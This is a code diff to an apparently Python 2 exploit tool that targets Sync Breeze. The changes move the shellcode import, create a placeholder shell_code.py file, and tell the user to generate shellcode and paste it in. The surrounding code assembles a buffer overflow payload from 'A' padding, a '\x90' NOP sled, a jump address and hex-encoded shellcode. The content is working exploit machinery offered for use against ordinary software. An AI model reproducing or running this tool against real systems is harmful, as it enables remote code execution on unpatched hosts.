@@ -4,7 +4,6 @@
 import random
 import string 
 import time
-from shell_code import shell_code 
 import fileinput
 from Banner import *
 import shutil
@@ -12,6 +11,7 @@ import readline
 import requests
 import os
 import sys
+
 
 W='\033[0m'     
 R='\033[31m'    
@@ -31,7 +31,9 @@ class Sync_Breeze():
             global O
             global B
             global P
-            global Y    
+            global Y  
+            with open('shell_code.py','w') as shell_code:
+                 shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')  
             mode = """
             ========================                          
                Target Sync Breeze
@@ -261,6 +263,7 @@ class Sync_Breeze():
                 from Bad_Character import Bad_Character_SyncBreeze             
                 run = Bad_Character_SyncBreeze()
             elif bad_op ==Bad_no and len(Bad_no)==2: 
+                print R+"\n\t\t!___To Continue Explit Generate shellcode and post it in shell_code.py file___! \n"+W 
                 pass
             else:
               print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
@@ -294,8 +297,9 @@ class Sync_Breeze():
                     exit()
                                 
      def attack_all(self):
-	     
-	       try: 	                     
+       
+	       from shell_code import shell_code      
+	       try:	                     
                    Start_string = self.location*"A"        
                    self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address)
                    self.NO_Operation =self.NO_Operation*"\x90"
@@ -335,7 +339,7 @@ class Sync_Breeze():
                    exit()  
                    
      def auto_write(self): 
-              
+                from shell_code import shell_code 
                 try:                
                   shell =str(shell_code).encode("hex")
                   shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
